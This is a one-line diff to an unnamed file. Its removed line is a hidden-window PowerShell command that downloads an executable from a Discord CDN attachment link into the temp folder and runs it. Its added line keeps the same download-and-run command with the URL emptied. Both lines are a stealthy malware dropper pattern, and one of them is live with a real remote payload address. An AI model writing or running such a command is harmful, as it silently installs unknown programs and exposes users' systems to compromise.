@@ -1,1 +1,1 @@
-powershell.exe -NoProfile -WindowStyle Hidden -Command "$url = 'https://cdn.discordapp.com/attachments/1104282156102058064/1427521431146856509/Ocean.exe?ex=68ffa52f&is=68fe53af&hm=ec23b801b5f880faf95dab0e23ae02f981d569f7edd3333285f8049e54eafef7&'; $out = Join-Path $env:TEMP 'popo.exe'; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process -FilePath $out"
+powershell.exe -NoProfile -WindowStyle Hidden -Command "$url = ''; $out = Join-Path $env:TEMP 'popo.exe'; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process -FilePath $out"
